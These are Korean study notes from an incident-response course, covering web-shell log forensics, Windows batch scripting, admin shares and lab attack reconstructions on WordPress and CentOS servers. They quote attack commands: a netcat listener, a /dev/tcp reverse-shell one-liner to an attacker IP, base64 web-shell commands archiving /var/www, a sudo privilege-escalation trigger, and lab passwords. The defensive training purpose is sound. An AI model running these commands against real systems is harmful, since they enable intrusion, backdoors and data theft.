문제 접근방법은 C -> B -> A 순서

Sublime Text

netstat -an



웹서비스 개발 운영 환경에 php, java, Python의 장고이면 공격자도 그에 맞는 언어로 개발된 악성파일로 공격함

공격자는 80, 8080, 53번 등의 WellKnown 포트를 열고 대기함
nc -lvp 53 (53번 포트 열고 대기)

피해자가 공격자한테 연결을 시도하면 연결이 맺어짐


LISTEN: 연결 대기중
ESTABLISHED: 연결 됨


출발하는 건 랜덤한 포트를 열기 때문에 WelKnown 포트가 아니라 아무 포트(40912, 3541 등)을 열 수 있음
도착하는 건 

1. access.log에서 /upload/editor/image 검색 72747? 의 이녀석을 유심히 함 보기
	1. 왜 /upload/editor/image를 검색하냐면 /var/www가 홈 디렉토리 이기 때문임
	2. 검색하다보면 /upload/editor/image/cmd.php 이런 게 나옴 그래서 cmd.php를 검색해보면
	3. cmd=cHdk가 나옴 -> pwd, cmd=bHMgLWFsICAvdmFyL3d3dy91cGxvYWQvZWRpdG9yL2ltYWdlLw%20%20 -> ls -al  /var/www/upload/editor/image/ image에 어떤 파일들이 있는지 나옴
	4. tar -cvf /var/www/upload/editor/image/1330664838 /var/www/
2. pstree_a 에서 /var/www/upload/editor/image/reverse.php -> 에서 보면 image에 reverse.php 
	1. -sh -c /bin/sh -i <&3 >&3 2>&3 => 이뇨속 딱 봐도 공격자네? ps_eaf에서 /bin/sh를 보니까 5248!
3. 출발포트는 랜덤이기 때문에 다른 포트번호와 확연히 다른 포트가 있으면 의심할 수 있음 => 144.206.162.21:80 이 공격자 IP, 
4. 

ostermiller


cmd.php가 나온 줄
- 81095 -> 별 거 없음
- 81096 -> cmd=cHdk => pwd
- 81105 -> cmd=bHMgLWFsICAvdmFyL3d3dy91cGxvYWQvZWRpdG9yL2ltYWdlLw => ls -al  /var/www/upload/editor/image/
- 81122 -> cmd=dGFyIC1jdmYgL3Zhci93d3cvdXBsb2FkL2VkaXRvci9pbWFnZS8xMzMwNjY0ODM4IC92YXIvd3d3Lw
	- => tar -cvf /var/www/upload/editor/image/1330664838 /var/www/
- 81141 -> cmd cGhwIC1mIC92YXIvd3d3L3VwbG9hZC9lZGl0b3IvaW1hZ2UvcmV2ZXJzZS5waHA
	- => php -f /var/www/upload/editor/image/reverse.php
	- \[25/Aug/2012:17:26:40 +0900] 시간은 이거 아닐까 싶네요

- 81127 


2012/08/25-17:26:40

2012/08/25-17:23:02


1330664838가 나온 줄
- 25300 - /upload/editor/image/1330664838.png를 가져옴


### 문제 ###
이벤트예약 웹사이트를 운영하고 있는 "깜짝이야"사의 관리자 앞으로 한 통의 협박 메일이 도착했다.
당장 10억을 입금하지 않으면, 확보한 자사의 웹페이지 소스코드를 모두 공개할 것이며,
추가적인 위협을 가하겠다는 내용이다.
관리자는 포렌직 전문가인 당신에게 침해사고 분석을 의뢰하였다.
침해된 시스템에 남겨진 흔적과 각종 로그파일을 분석하여 다음 사항을 밝혀내시오.


A. 공격자가 웹페이지 소스코드를 유출한 시간(UTC+09:00)은 ? (yyyy-MM-dd_hh:mm:ss) 
access.log
B. 리버스쉘(Reverse Shell)을 동작시키는 프로세스 ID(PID)는 ? (10진수) 
pstree_a -> ps_eaf
C. 리버스쉘(Reverse Shell)에 대한 공격자 주소(IP)는 ? 
netstat_an


답 입력 : yyyy-MM-dd_hh:mm:ss_5248_144.206.162.21
정답 : 2012-08-25_17:23:02_5248_144.206.162.21


### 풀이과정 ###
C->B->A 순서로 진행함

C. 리버스쉘(Reverse Shell)에 대한 공격자 주소(IP)는 ? 
netstat_an




질문
- 81141을 보면 디코딩 했을 때 reverse.php를 실행시키는 명령어가 나오고 그 앞에서 GET 으로 압축파일을 탈취하는 명령어가 나옴
  그냥 GET 요청으로 /var/www/를 압축한 파일을 탈취했다면 뒤에 나오는 reverse.php는 왜 하는 것인가? 이미 탈취는 했는데

해결!


#### 1. javascript excape() 우회 기법 ####
- 정규표현식(RegExr)을 활용한 필터 방법
- ex. %u03eb%ueb59%ufff8%u4949%u6b42
	- 표현식 작성: %u\[a-f,0-9](4) 
		- -> %u로 시작하고, 알파벳은 a-f 사이, 숫자는 0-9 사이로 4바이트인 것만 체크함

#### 2. JavaScript eval() 우회 기법 ####
- 정규표현식(RegExr)을 활용한 필터 방법
- ex. \x76\x61\x2E\x6F
	- 표현식 작성: \\x\[0-9, A-F]{2}
		- -> \x로 시작하고, 알파벳은 A-F 사이, 숫자는 0-9 사이로 2바이트인 것만 체크함







# 책 내용 #


# 침해사고의 흔적들 #


## 윈도우/리눅스 주요 아티팩트 ##


아티팩트: 흔적이라는 단어만으로 번역하기에는 전체 의미가 축소되기 때문에 번역없이 '아티팩트'라고만 부름






비정상적인 프로세스 정보
- 실행중인 프로세스 디렉토리를 추적
- 프로세스 상세 정보 확인 - 설명, 회사 이름 등 정보로 추측 가능 (공격자 입장에서 이런 것들까지 신경쓰기에 ROI가 안 나와서 이 부분이 이상할 때가 있음)
- 임시 폴더에서 실행중인 프로세스 확인 - 대부분의 악성코드가 이 공간을 활용함
	- 실행중인 프로세스가 임시 폴더의 DLL을 가리키는 경우도 악성코드임
	- -> 악성 DLL이 임시 폴더에 있고 프로세스가 임시 폴더의 DLL을 가리키면 쎄함이 느껴지면서 악성코드 의심해볼 수 있음
	- 마이크로소프트에서 만든 DLL은 따로 전자 서명이 있는데 악성 DLL은 전자 서명이 없기 때문에 서명이 확인 안 되면 악성 DLL일 가능성이 있음



Process Explorer을 다운 받았을 때 이걸로 프로세스들과 프로세스가 사용하는 DLL도 확인할 수 있음
- dll을 확인하고 싶으면 View -> Lower Panel View -> DLLs 를 하면 아래에 패널이 하나 보임
- 아무 dll이나 더블클릭하면 해당 dll의 속성이 보이는데 여기서 Load Address 옆의 Verify를 누르면 Company의 (Verified)가 안 뜨면 악성dll로 의심해볼 수 있음
- 악성 사용자는 자동 실행을 좋아하기 때문에 자동 실행으로 되어 있어도 악성으로 의심해볼 수 있음








ARP cast poisoning의 특징은 

ip주소는 다르지만 mac 주소는 같아지게 되어서 














윈도우 배치 스크립트: MS-DOC에서 명령어를 일일이 입력하는 번거로움을 해소하고자 편리하게 텍스트 파일에 명령어들을 나열시켜 놓은 스크립트임, 보통 배치 or 배치 스크립트 or 배치 파일이라고 부름





## 배치 스크립트 입출력 ##
### echo ###

그냥 echo => ECHO 설정
![[Pasted image 20260225092240.png]]

echo. => 빈 줄 출력
![[Pasted image 20260225092305.png]]

echo (아무 텍스트) => 텍스트 출력
![[Pasted image 20260225092409.png]]


### 리다이렉션(>, >>) ###

![[Pasted image 20260225092858.png]]


![[Pasted image 20260225092946.png]]


![[Pasted image 20260225093009.png]]


![[Pasted image 20260225093053.png]]



### 파이프(|) ###

명령과 명령을 연결할 때 사용하는 명령어(?)
 
그냥 'net start'를 했을 때
![[Pasted image 20260225093411.png]]


"Play and Play"를 추가했을 때 | 로 연결했을 때 표시되지만 타겟되는 문자열은 대소문자를 구분하는 모습을 보여줌
![[Pasted image 20260225093914.png]]

 
/i 옵션을 붙이면 대소문자 구분이 됨 그리고 Windows에서는 명령어에서 대소문자 구분을 안 해서 두 번째에 적힌 것처럼 적어도 문제없이 작동함(리눅스는 대소문자 구분하기 때문에 안 됨)
![[Pasted image 20260225095132.png]]






---
## 배치 파일 작성 ##

편집기를 사용해서 배치 파일을 작성할 수 있음

인코딩을 ANSI로 설정
![[Pasted image 20260225094028.png]]


.bat을 붙이고 ALL types로 지정
![[Pasted image 20260225094322.png]]



첫 번째 줄에 @echo off 작성 -> 이후에 작성된 명령을 출력하지 않게 하는 명령어
두 번째 줄부터 명령 및 구문을 입력하고 실행하면 명령문이 실행 됨(echo Hello, World!)
세 번째 줄의 pause>nul은 아무런 메시지도 띄우지 않고 사용자가 키를 누를 때까지 무한 대기하라는 명령어, 그냥 pause만 쓰면 "계속하려면 아무 키나 누르십시오..."라고 뜸
![[Pasted image 20260225102305.png]]



### 주석 ###
REM이나 ::을 쓰면 주석으로 처리됨, 
![[Pasted image 20260225105739.png]]



### 변수 ###
- 선언할 때는 'set \[옵션]  변수명 = 문자열' 과 같은 형태로 작성
	- ex. set /p some = some is sum?
- 변수를 사용할 때는 변수명 양 옆에 %기호를 붙여서 사용함
	- ex. echo %some%

**※ 한 가지 주의사항 같은 게 있다면 이거 띄어쓰기 하나 잘못해도 작동이 안 됨 ㅈ같음**
![[Pasted image 20260225110324.png]]



### 레이블 ###
레이블은 goto와 같이 사용되는 책갈피 같은 거임. 작성할 때는 :alpha 와 같이 : 뒤에 쓰면 되고 goto를 통해서 레이블의 위치로 명령이 옮겨가게 됨
![[Pasted image 20260225110707.png]]






---
## 정보 수집 ##

### 시스템 정보 수집 ###

result라는 파일에 system info, env, process list 등의 정보를 입력하는 명령어가 작성된 bat파일을 작성함
![[Pasted image 20260225112616.png]]


result를 열면 아래와 같이 내용이 잘 입력되어 있음
![[Pasted image 20260225112640.png]]



### 시스템 정보 수집 ###


net share를 하면 공유 이름과 리소스가 기본으로 나오는데 공격자가 C\$와 ADMIN\$를 자주 사용함, 따라서 필요없다면 지우는 게 좋을 수 있음
![[Pasted image 20260225113144.png]]


fsmgmt.msc를 통해서 공유폴더를 GUI로 볼 수 있고, 여기서 공유 중지를 통해서 공유되는 C, ADMIN을 제거할 수 있음
![[Pasted image 20260225113618.png]]


C\$와 ADMIN\$는 삭제가 정상적으로 됨
![[Pasted image 20260225113655.png]]


하지만 IPC\$는 프로세스끼리 공유하는 거여서 삭제할 때 서비스 에러가 발생할 수 있기 때문에 삭제가 안 됨
![[Pasted image 20260225113735.png]]


컴퓨터를 껏다키면 다시 공유들은 다시 생김
![[Pasted image 20260225114229.png]]

![[Pasted image 20260225114148.png]]


### 원격 접속 ###

![[Pasted image 20260225115031.png]]


![[Pasted image 20260225115048.png]]


net use X: \\192.168.0.128\C$ kisec123 /user:administrator 를 통해서 드라이브를 원격으로 접속할 수 있음

![[Pasted image 20260225122044.png]]

로컬에 보이는 드라이브 X
![[Pasted image 20260225122118.png]]

Victim2 가상 환경의 드라이브와 서로 같음
![[Pasted image 20260225122205.png]]


로컬에서 드라이브에 만든 게 원격의 C에 만들어짐
![[Pasted image 20260225122441.png]]

![[Pasted image 20260225122515.png]]

이렇게 공유폴더를 통해서 공격자가 악성코드를 심을 수 있어서 공유 설정을 삭제해야 하는데 fsmgmt.msc 에서 삭제해도 윈도우를 껐다 키면 다시 돌아옴 


![[Pasted image 20260225123351.png]]


AutoShareWks를 레지스트리 편집기에 아래 경로로 추가 하면 껐다 켰을 때 공유가 재생성 안 됨
![[Pasted image 20260225123441.png]]

net share를 통해서 확인해보면 기본 공유인 IPC$를 제외하고 안 뜸
C$ 공유가 사라졌기 때문에 로컬에서 원격으로 접속할 수도 없음

![[Pasted image 20260225123533.png]]

![[Pasted image 20260225123647.png]]

net use X: \\192.168.0.128\C$ kisec123 /user:administrator 공유가 사라졌기 때문에 접근할 접속도 실패함

위의 공유는 취약점이기 때문에 위험등급도 높아서 필요한 게 아니면 꼭 삭제하는 게 중요함









---
---
# LAB: 침해사고분석 실습 #




엑세스 시간 예시
YYYYMMDDHHMMSS 
2019년 1월 2일 오후 2시 15분 -> 201901021415


- 바이러스 토탈 활용





![[Pasted image 20260225152319.png]]








Case 1-2: DBD (Server)



kali에 whatweb이 뜨고 log를 보면 됨
웹 로그를 보면 14번까지 다 웹로그를 보면 알 수 있음

\- 15. 16


1. whatweb을 실행한 IP를 입력하세요
	 ![[Pasted image 20260226102634.png]]
	30번줄의 로그를 뜯어보면 
	- `GET /`: GET요청으로 홈페이지를 가져오라는 것
	- `HTTP/1.1 200 76056: HTTP1.1` 버전을 사용하여 통신하여 성공(200)했고, 서버가 보낸 데이터의 크기가 76056이라는 것
	- `-`: 이 페이지에 오기 이전 페이지의 주소를 뜻하는데 `-`는 직접 접속했음을 뜻함
	- **`WhatWeb/0.4.8-dev`: 접속한 주체로 일반 브라우저에서 접속한 게 아니라 WhatWeb이라는 스캔 도구에서 접속했음**
	
2. 정보수집도구(whatweb)을 실행한 최초 시간을 입력하세요. (ex: 20250805162728)
	   ![[Pasted image 20260226102700.png]]
	   
3. 워드프레스 취약점 스캐너(wpscan)를 실행한 IP를 입력하세요.![[Pasted image 20260226110611.png]]

4. 워드프레스 취약점 스캐너(wpscan)를 실행한 최초 시간을 입력하세요. (ex: 20250805162728)
	![[Pasted image 20260226110259.png]]
	
5. SQL Injection 공격 도구(sqlmap)로 공격했던 PHP 파일의 이름을 입력하세요.![[Pasted image 20260226110746.png]]
	
6. SQL Injection 공격 도구(sqlmap)를 실행한 IP 두 개를 입력하세요. (2개의 IP를 '/' 기호로 구분하여 공백없이 입력하세요)![[Pasted image 20260226110938.png]]

	![[Pasted image 20260226111015.png]]
4. SQL Injection 공격 도구(sqlmap)를 실행한 최초 시간을 입력하세요. (ex: 20250805162728)![[Pasted image 20260226111607.png]]

5. 웹 디렉터리/파일 스캔 도구(dirbuster)를 실행한 IP를 입력하세요.![[Pasted image 20260226112003.png]]

6. SQL Injection 공격하였던 IP 중 최초로 로그인 했던 IP를 입력하세요.
	**192.168.50.30**
	sqlmap이 유우명한 SQLi 공격 도구임, 따라서 sqlmap을 사용하는 로그를 찾아봄
	192.168.50.46, 192.168.50.30 이렇게 2개가 있으니까 이 둘 중에서 최초로 로그인 했던 IP를 찾으면 됨
	POST와 login.php를 동시에 가지고 있는 IP중에서 30이 먼저 나오므로 192.168.50.30
	![[Pasted image 20260226143817.png]]
	
7. SQL Injection 공격하였던 IP 중 최초로 로그인 했던 시간을 입력하세요. (ex: 20250805162728)
	위의 사진에서 로그인 시간도 나옴
	
8. 공격자가 웹쉘을 업로드 한 시간을 입력하세요. (ex: 20250805162728)
	1. 
9. 업로드 한 웹쉘 파일 이름을 입력하세요.
10. 공격자가 웹쉘에 최초로 접근 성공한 시간을 입력하세요. (ex: 20250805162728)
11. 웹쉘 파일에 최초로 접근한 IP를 입력하세요.
12. 악성스크립트가 삽입된 자바스크립트 파일 이름을 입력하세요.
13. 15번의 자바스크립트가 파일이 변경(Change)된 시간을 입력하세요. (ex: 20250805162728)


192.168.50.46 - - [18/Jul/2019:14:24:02 +0900] "POST /wp-content/plugins/like-dislike-counter-for-posts-pages-and-comments/ajax_counter.php HTTP/1.1" 200 690 "-" "sqlmap/1.0-dev (http://sqlmap.org)"

192.168.50.46 - - [18/Jul/2019:14:25:03 +0900] "POST /wp-content/plugins/like-dislike-counter-for-posts-pages-and-comments/ajax_counter.php HTTP/1.1" 200 751 "-" "sqlmap/1.0-dev (http://sqlmap.org)"

192.168.50.30 - - [18/Jul/2019:14:27:23 +0900] "POST /wp-content/plugins/like-dislike-counter-for-posts-pages-and-comments/ajax_counter.php HTTP/1.1" 200 666 "-" "sqlmap/1.2.11.12#dev (http://sqlmap.org)"



















**※ 아래는 가상환경의 cli에 로컬의 cli에서 ssh로 붙은 화면임**


![[Pasted image 20260226094420.png]]
wordpress.conf를 보면 로그는 /var/log/apache2에 있다는 걸 알 수 있음


![[Pasted image 20260226101143.png]]
grep -i whatweb wordpress.local_access.log: wordpress.local_access.log에서 whatweb이라는 단어를 찾음. 윈도우즈의 findstr과 비슷하다고 볼 수 있음 -i 는 대소문자를 구분하지 않는다는 것

이걸 통해서 /var/log/apache2의 wordpress.local_access.log.1 에 whatweb을 사용하는 부분이 있다는 걸 알 수 있음








정답

1. 랜섬웨어
2. 임시 파일이 저장되는 위치를 찾음
랜섬노트 생성 시간을 보고 악성코드가 실행된 시간 및 악성스크립트 실행 시간을 유추함
![[Pasted image 20260226141136.png]]

findstr /s "eval(" * js

jquery-migrate.min\[1].js



**javascript beautifier**: 자바 스크립트를 이쁘게 볼 수 있게 만들어줌
![[Pasted image 20260226141826.png]]





grep POST * 


11. 3.php
12. 





피버팅: 서로 다른 망을 오가는 것
레터럴 무브먼트: 같은 망 안에서 다른 시스템으로 이동






새로 접속
![[Pasted image 20260226153833.png]]
비밀번호: admin123





192.168.0.50







## 실습CASE_2 - 192.168.0.170 - Deface_Response  ##


- ### 공격 과정 ###
	1. 192.168.0.50(공격자)가 TCP Syn Scan을 통해서 피해자 서버의 정보를 알아냄
	2. 그 다음에 SSH로 로그인을 하기위한 ID/패스워드값을 Brute Force로 탈취 시도
	3. 탈취 성공
	4. 192.168.0.130으로 IP 변조 후 SSH 접속
	5. suggester.sh, pvac.py, slider2.jpeg 이미지 웹쉘을 올려서 피해자 서버와 Reverse Shell을 맺음
	6. crron.sh 스크립트 등록(?), if.sh, sudoers, crontab 수정
	7. 사이트 해킹

- ### 침해사고 개요도 ###
	- 사고 일시: 2022/04/18 - 11:40
	- 피해 내역
		- 대외서비스 홈페이지
			- IP: 192.168.0.170
			- OS: CentOS 7 (Kernel: ...)
			- 활성 서비스: Web Server - Apache2.4.6 (Port 80), SSH 
	- 인터뷰 내용
		- 홈페이지 리뉴얼 기간동안 원격 접속을 위한 22포트 오픈 및 sshd 활성화
	- 초동 조치 사항
		- 메인페이지 변조 정황 홈페이지 담당자 신고 접수
		- 고객사 정보보호팀으로 사고 전파 (SMS, E-mail)
		- 메인페이지(index.php) 비활성화
		- 분석 PC(192.168.0.1) 제외 SSH 접근 차단 
		- 상세 분석을 위한 사전 정보 수집
	
	
- ### 분석 결과 ###
	- 공격자 정보
		- 192.168.0.50 (Port scan, SSH Brute force) 
		- 192.168.0.130 (권한 상승, Backdoor 생성, Deface 수행)
	
	- 결과 요약
		- SSH Bruteforce 수행
		- 취약점을 활용한 권한 상승 (CVE-2021-3156)
		- 백도어 생성
		- 대외 서비스 메인 페이지 변조 (Deface)
	
	- 대응 방안
		- 허용된 IP 외의 SSH 접근 차단
		- 비밀번호 복잡동 따른 안전한 비밀번호 설정
		- CVE-2021-3156 취약점 패치 (sudo 업그레이드)


- ### 사전 수집 정보 ###
	- 네트워크 패킷
		- Network Packer_20220418.pcap (Wireshark)
	- 프로세스 및 서비스(데몬) 리스트
		- process_info.txt
		- service_info.txt
	- 스케줄 정보
		- crontab_list.txt
	- 사용자 정보
		- user_info.txt
	- 네트워크 정보
		- arp_table.txt
		- netstat.txt


- ### 타임라인 ###
	- 10:46:36 ~ 10:46:41 - TCP Half-Open Scan -> (네트워크 패킷 확인)
	- 10:46:59 ~ 10:54:53 - SSH Brute force 공격 수행 (id: kisec)
	- 10:57:25 - SSH를 활용한 최초 침투
	- 11:00:13 - suggester.sh 다운로드 (Exploit 제안 도구)
	- 11:01:49 - pvac.py 다운로드 (Exploit)
	- 11:03:32 - 권한 상승 성공 (CVE-2021-3156)       -> suggester.sh, pvac.py를 이용해서 권한 상승 시킴
	- 11:03:47 - 백도어 계정 생성 (admin)
	- 11:05:45 - .htaccess 생성                               -> 이미지 웹쉘을 php 코드로 실행하기 위해서 htaccess를 생성 및 수정해줘야함
	- 11:06:52 - slider2.jped 수정 (이미지 웹쉘)
	- 11:15:12 ~ 11:35:05 - 웹쉘 접근 (POST)
	- 11:34:55 - httpd.conf 수정
	- 11:36:05 - Reverse Shell로 접속                          -> 웹쉘을 이용해서 Reverse Shell 접
	- 11:40:01 - crron.sh 생성 (11:40:04 실행) 
	- 11:40:04 - crontab, sudoers 수정
	- 11:41:36 - Deface 공격                                   -> 홈페이지 변경
	- 11:41:51 - Reverse Shell 종료


- ### 상세 분석 ###
	- #### 1. TCP Half-Open Scan ####
		- 공격자는 서버를 대상으로 열려있는 포트를 확인하기 위해서 **TCP Half-Open Scan**를 수행하였으며, 22번 포트와 80번 포트가 열려있음을 확인함
		※ TCP Half-Open Scan: SYN 패킷을 보낸 후 타겟에서 SYN-ACK으로 응답(Open)을 했을 때 공격자 측에서 RST(강제 종료 신호) 패킷을 전송, 3 Way Handshake를 진행하지 않기 때문에 로그가 안 남음

![[Pasted image 20260227112453.png]]

공격자(192.168.0.50)가 피해자 서버(192.168.0.170)으로 SYN을 보내서 포트가 열려있는지 확인하고 피해자 서버는 방화벽이나 차단 정책 등에 의해서 ICMP로 Destination unreachable로 막혀있다는 것을 알림. 그러다가 8104에서 22번 포트로 SYN 체크했던 게 8114로 SYN-ACK가 오면서 22번 포트가 열려있다는 걸 알게 되고, 공격자는 ACK를 안 보내고 RST(Rest, 강제 종료 신호)를 보내서 3-Way-Handshake를 성립 되지 않기 때문에 로그가 안 남게됨
- 
	- #### 2. SSH Brute force ####
		- 22번 포트(SSH)가 열려있음을 확인한 후 id와 패스워드를 탈취하기 위해 SSH Brute force 공격 수행
		- grep -i "failed password" /var/log/secure, lastb 를 통해서 확인 가능
![[Pasted image 20260227115945.png]]
- 
	- #### 3. 최초 침투(SSH) 및 시스템 정보 수집 ####
		- 공격자는 계정의 PW를 확보 후 활성화된 SSH 서비스를 사용하여 최초 침투에 성공한 후 192.168.0.50 -> 192.168.0.130으로 IP를 변경하여 접속했고 시스템에서 동작함 (접속 ID: kisec)
		![[Pasted image 20260227120238.png]]
		
		- 이후 공격자는 시스템의 정보를 탐색하기 위한 명령들을 수행했고 .bash_history에서 확인가능
		![[Pasted image 20260227120528.png]]

- 
	- #### 4. 1차 악성코드 다운로드 ####
		- 시스템 정보 탐색 후 피해자의 서버에서 공격자 서버에 올려놓은 악성 파일들을 wget을 사용해서 다운로드함
			- 다운로드한 파일들: suggester.sh, pvac.py
		![[Pasted image 20260227120849.png]]

	- #### 5. 권한 상승 성공 ####
		- 공격자는 권한 상승을 위해 **Sudo 취약점을 악용(CVE-2021-3156)**
		- Exploit에 성공할 경우 `ID: gg, PW: gg` 입력 시 root 권한으로 로그인됨
		※ CVE-2021-3156: Sudo 명령어에서 힙 오버플로우로 인해 발생하는 권한 상승 취약점
		
		![[Pasted image 20260227121731.png]]
		sudo 버전 확인 및, 취약점 확인 
	
	
		![[Pasted image 20260227121916.png]]
		chmod로 /tmp/pvac.py 권한 변경 및 수정, su gg로 exploit 실행


		![[Pasted image 20260227122105.png]]
		/etc/passwd로 확인 gg 계정 삽입 (uid 0, gid 0


## \* Tip ##
한 가지 팁이 있다면 cat /etc/passwd의 출력값은 사용자 계정 정보 리스트를 나타내는 파일이고 각 줄은
username:password(보통 x로 표시, 진짜 값은 /etc/shadow에 표시):UID:GID:comment:home_directory:shell(로그인 시 실행되는 쉘)
아래와 같은 뜻을 가지는데 리눅스에서 관리자의 UID값은 0임. 따라서 똑같이 UID값이 0인 계정을 만든다면 해당 계정은 관리자로 인식될 수 있으므로 /etc/passwd에서 root를 빼고 UID가 0인 값을 찾아보면 의심스러운 녀석이 보이게 됨

![[Pasted image 20260228142606.png]]









![[Pasted image 20260227140553.png]]


**답**
- Flag1: 2021-3156
- Flag2: slider2.jpeg
- Flag3: 192.168.0.50/192.168.0.130
- Flag4: /usr/lib/crron.sh
- Flag5: sudoers/if.sh/crontab
- Flag6: SSH



비밀번호: K!SEC_DEF@CE_JBO_TE@CHER



1) TCP SYN을 보내서 서버의 열려있는 포트를 확인함 -> 22번 포트가 열려있는 것을 확인!
2) Brute Force 공격으로 SSH 접속을 위한 ID, 비밀번호 탈취 -> 탈취 성공!
3) 탈취해낸 id, 비밀번호를 통해서 22번 포트로 ssh 최초 접근
4) 피해자 서버에서 공격자 서버에 있는 suggester.sh, pvac.py를 wget으로 다운로드
5) `sudoedit -s /` 을 통해서 현 사용자가 관리자 권환을 획득함
	- `sudoedit`: 일반 사용자가 관리자 권한으로 파일을 안전하게 편집할 수 있게 해주는 명령어
	- `-s /`: 인수로 전달된 내용은 쉘 모드에서 실행하라는 옵션이고 어쩌구 저쩌구 몰라레후
6) `chmod u+x /tmp/pvac.py` 를 통해서 /tmp/pvac.py의 실행 권한을 얻은 다음 실행하고 su gg(switch user)로 gg로 유저를 바꿈
7) /etc/passwd에 gg라는 계정 삽입 및 `su gg`를 통해 계정을 전환함
8) 백도어 계정으로 admin 계정을 생성(이러면 gg는 왜 만든 거지?)
9) admin 계정으로 전환한 다음 /var/www/html/wordpress/wp-content/uploads/2022/03/ 에 .htaccess를 생성
10) .htaccess는 jpeg파일을 php파일로 인식하도록 설정하는 파일이고 (어떻게 생겼는지는 몰라도) slider2.jpeg는 바이너리 파일 내에 웹쉘 코드가 삽입했고, httpd.conf에서 AllowOverride 를 None에서 All로 바꿔서 .htaccess 코드가 동작할 수 있게함
11) cat access_log | grep -i "slider2.jpeg" 를 보면 slider2.jpeg에 POST 방식으로 명령이 전달 된 것들이 확인됨 (slider2.jpeg 웹쉘로 접근)
12) 이후 전달된 명령들을 확인하면 명령들 중에 `bash -i >& /dev/tcp/192.168.0.130/53 0>&1`가 있음 -> 잘은 모르겠지만 리버스 쉘을 하기 위한 공격코드임, 이 명령어를 통해서 리버스쉘이 맺어짐
13) 리버스쉘을 맺은 다음 wget을 사용해서 crron.sh다운로드 악성파일을 다운받고 `chmod u+x crron.sh`를 통해서 crron.sh에 실행 권한을 추가 및 실행
	![[Pasted image 20260228165102.png]]
	![[Pasted image 20260228165117.png]]
14. crron.sh를 사용해서 sudoers, crontab 파일 수정하고 대충 이런 걸 했다고 하네요
15. 마지막으로 웹 사이트 배경 이미지를 지맘대로 바꿈..





## 리눅스의 사용자와 파일의 권한에 대한 정리! ##
리눅스에서는 하나의 컴퓨터에 사용자가 여러 개가 있을 수 있음. 파일도 여러 개가 있을 수 있고 각 파일당 읽기/쓰기/실행 권한이 따로 나뉘어져 있음
권한은 모든 사용자가 모든 파일에 대한 모든 권한을 가지고 있는 게 아니라 사용자마다 차이가 있음, 단 해당 파일을 만들거나 다운로드 받은 파일(자신이 소유한 파일)은 해당 파일에 대한 모든 권한을 가지고, 관리자는 모든 파일에 대한 모든 권한을 가짐

예를 들어서 userA, userB가 있고 some.py 라는 파일이 있음. 이때 some.py 소유자는 userC로 userA와 userB 둘 다 소유자가 아님
userA가 접속한 뒤 `chmod u+x some.py`를 통해서 some.py 대한 실행 권한을 가지게 되면 userA는 some.py를 실행할 수 있게됨
하지만 userB가 접속하고 some.py를 실행하려고 하면 소유자도 아니고, chmod로 권한을 할당받지도 않았기 때문에 some.py를 실행 못 함

이렇게 리눅스에서는 각각의 파일에 3가지 권한(읽기, 쓰기, 실행)이 있고, 사용자는 각 파일에 대한 권한을 다 따로 부여받음(소유자, 관리자 제외)!!

한 가지 수정 사항이 있는데 읽기, 쓰기권한과 실행 권한은 쪼끔 결이 다름. 소유자나 관리자이면 모든 파일에 대한 읽기, 쓰기가 가능하지만 실행 권한은 없음. 특정 파일에 대해서 명시적으로 "이건 프로그램이야! (chmod)" 와 같이 지정해준 파일만 실행할 수 있게 됨













비밀번호의 안정성을 확인하는 사이트:  **secure is my password**
비밀번호는 소문자, 대문자, 숫자, 특수문자들이 다 포함되지 않아도 글자수가 단순히 많기만 해도 어느정도 안전함. 단, 글자의 단어가 뜻을 가지면 안 됨 (ex. lemon, yas 등)










![[Pasted image 20260227151757.png]]

![[Pasted image 20260227151631.png]]

![[Pasted image 20260227151730.png]]

![[Pasted image 20260227151901.png]]


![[Pasted image 20260227152313.png]]

![[Pasted image 20260227152339.png]]

![[Pasted image 20260227152353.png]]

![[Pasted image 20260227152505.png]]





## 1. 정찰 ##
### Kali 작업 ###
![[Pasted image 20260227153417.png]]

whatweb: 타겟 ip의 웹 환경을 수집하는 액티브도구(?), 아무곳에나 쓰면 잡혀갈 수도 있음



---
---
## 2. 자원 개발 ##
공격에 활용할 인프라를 구축하는 단계

![[Pasted image 20260227153838.png]]

![[Pasted image 20260227153938.png]]

![[Pasted image 20260227154134.png]]

![[Pasted image 20260227154426.png]]

![[Pasted image 20260227154456.png]]

![[Pasted image 20260227154611.png]]

![[Pasted image 20260227154705.png]]

![[Pasted image 20260227154800.png]]

![[Pasted image 20260227154910.png]]

![[Pasted image 20260227155130.png]]

![[Pasted image 20260227155208.png]]

/var/lib/veil/output/handlers/mshta1.rc
![[Pasted image 20260227155917.png]]


CVE-2016-0189 exploit page 구성

![[Pasted image 20260227162012.png]]

![[Pasted image 20260227162413.png]]



aaa
![[Pasted image 20260227162541.png]]

![[Pasted image 20260227162840.png]]

![[Pasted image 20260227162942.png]]



---
---
## 3. 최초 침투 ##










---
---
## 4. 실행 

![[Pasted image 20260227171726.png]]

![[Pasted image 20260227171805.png]]

![[Pasted image 20260227171828.png]]

![[Pasted image 20260227171854.png]]

![[Pasted image 20260227171910.png]]

![[Pasted image 20260227172107.png]]

![[Pasted image 20260227172432.png]]

![[Pasted image 20260227172539.png]]

![[Pasted image 20260227172702.png]]













한국정보보호센터 부산센터
전상민 강사(jsm@\securityhub.kr)




